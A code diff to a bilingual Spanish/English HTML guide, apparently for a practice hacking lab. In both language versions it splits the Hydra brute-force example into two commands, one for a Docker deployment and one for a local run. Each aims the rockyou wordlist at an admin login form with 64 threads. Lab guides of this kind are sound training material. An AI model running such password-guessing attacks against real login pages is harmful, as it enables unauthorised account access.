@@ -133,7 +133,13 @@
     <h3>Herramientas</h3>
     <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
     <h4>HTTP Login — Hydra</h4>
-    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+    <pre><code class="language-bash"># Con deploy.sh / Docker (puerto 80):
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  TARGET_IP http-post-form \
+  "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64
+
+# En local sin Docker (puerto 5000):
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   TARGET_IP -s 5000 http-post-form \
   "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64</code></pre>
     <h4>HTTP Login — Burp Suite Intruder</h4>
@@ -190,7 +196,13 @@ run</code></pre>
     <h3>Tools</h3>
     <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
     <h4>HTTP Login — Hydra</h4>
-    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+    <pre><code class="language-bash"># With deploy.sh / Docker (port 80):
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  TARGET_IP http-post-form \
+  "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64
+
+# Local without Docker (port 5000):
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   TARGET_IP -s 5000 http-post-form \
   "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas" -t 64</code></pre>
     <h4>HTTP Login — Burp Suite Intruder</h4>
